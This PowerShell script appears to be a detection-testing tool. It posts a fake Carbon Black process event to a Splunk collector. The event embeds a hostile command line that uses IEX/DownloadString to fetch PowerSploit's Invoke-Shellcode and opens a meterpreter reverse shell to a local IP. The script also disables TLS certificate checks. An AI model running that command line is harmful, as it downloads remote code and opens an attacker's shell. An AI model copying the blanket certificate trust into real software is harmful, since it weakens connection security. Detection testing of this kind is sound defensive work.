$MenuIcon = '
   _________             .__         ___________             .__          __                
  /   _____/ ____   ____ |__| ____   \_   _____/ _____  __ __|  | _____ _/  |_  ___________ 
  \_____  \ /  _ \ /    \|  |/ ___\   |    __)_ /     \|  |  \  | \__  \\   __\/  _ \_  __ \
  /        (  <_> )   |  \  \  \___   |        \  Y Y  \  |  /  |__/ __ \|  | (  <_> )  | \/
  /_______  /\____/|___|  /__|\___  > /_______  /__|_|  /____/|____(____  /__|  \____/|__|   
         \/            \/        \/          \/      \/                \/                   
  ==============================================================================================
'
#Trust all certs
Add-Type -TypeDefinition @'
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
'@

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
[System.Net.ServicePointManager]::CertificatePolicy = New-Object -TypeName TrustAllCertsPolicy

 function Invoke-PwshArbitraryCommandExecution {
   param(
     [String]$ComputerName,
     [Parameter(Mandatory=$true)]
     [String]$SplunkIP,
     [Parameter(Mandatory=$true)]
     [String]$SplunkPort,
     [Parameter(Mandatory=$true)]
     [String]$Token
   )
   if($ComputerName -eq $null){
     "Did not choose computer name will set automatically to $env:COMPUTERNAME"
   }
   #Create JSON to send to Splunk, must include event field upon sending otherwise you will get an error.
   $Event = ConvertTo-Json -InputObject @{ 
      host= 'cbserver'
      sourcetype='bit9:carbonblack:json';
      event = @{ 
      is_process='proc';
      cb_server= 'cbserver';
      command_line = '"c:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -nop -noexit -executionpolicy bypass -c IEX ((New-Object Net.WebClient).DownloadString("https=//raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1")); Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost 192.168.80.129 -Lport 4444 -Force';
      computer_name = "$ComputerName";
      event_type = 'proc';
      expect_followon_w_md5= 'false';
      filtering_known_dlls= 'false';
      md5= '95000560239032BC68B4C2FDFCDEF913';
      parent_create_time= (Get-Date (Get-Date).ToUniversalTime() -UFormat %s) - 600;
      parent_guid= '-5247729666896787000';
      parent_md5= '9A68ADD12EB50DDE7586782C3EB9FF9C';
      parent_path= 'c:\windows\system32\wscript.exe';
      parent_pid= '3724';
      parent_process_guid= '00000010-0000-0e8c-01d5-f07419d75576';
      parent_sha256= '62A95C926C8513C9F3ACF65A5B33CBB88174555E2759C1B52DD6629F743A59ED';
      path= 'c:\windows\system32\windowspowershell\v1.0\powershell.exe';
      pid= '5320';
      process_guid= '00000010-0000-14c8-01d5-f07419f8eb97';
      process_path= 'c:\windows\system32\windowspowershell\v1.0\powershell.exe';
      sensor_id= '16';
      sha256= 'D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677';
      timestamp= Get-Date (Get-Date).ToUniversalTime() -UFormat %s;
      type= 'ingress.event.procstart';
      uid= 'S-1-5-21-2977773840-2930198165-1551093962-1202';
      username= 'Badlarry';
     };
      } -Compress
      
    #Create Header to receive TOKEN
    $Headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $Headers.Add("Authorization", "Splunk $Token")
    #Create Splunk Server variable to hand IP and Port
    $SplunkServer = "https://{0}:{1}/services/collector/event" -f $SplunkIP,$SplunkPort
    Invoke-RestMethod -Uri $SplunkServer -Method Post -Headers $headers -Body $Event
 }
 
 function Start-SonicEmulator {
   $Prompt =
   "Write-Host '<=So' -ForegroundColor Yellow -NoNewline; Write-Host 'nic' -ForegroundColor Red -NoNewline; Write-Host 'Emu=>' -ForegroundColor Blue -NoNewline"
        
     "Welcome to Sonic Emulator please fill the following variables so that we may begin testing"
     "(Splunk Server IP)"
     $SplunkServer = Read-Host
     "(Splunk Server Port)"
     $SplunkPort = Read-Host
     "(Token)"
     $Token = Read-Host
   
   :outer while($true){
     Clear
     $MenuIcon
     Write-Host '+ 0       - Total Emulation              '
     Write-Host '+ 1       - Endpoint Techniques          '
     Write-Host '+ 2       - Inbound Attacks              '
     Write-Host '+ Exit    - exits from the script        '  
     Write-Host '+ Credits - Authors                      '
     Invoke-Expression ($Prompt)
     $Choice = Read-Host
     if ($Choice -eq 0){
       "[Starting Powershell-Based Attacks]"
       $Result = Invoke-PwshArbitraryCommandExecution -SplunkIP:$SplunkServer -SplunkPort:$SplunkPort -Token:$Token -ComputerName:$ComputerName
       if($Result.text -eq 'Success'){
         Write-Host '[PowerShell Arbitrary Execution Successful]' -ForegroundColor Green
         Read-Host 'Press any key to continue'
       }
     
     }
   }
 }
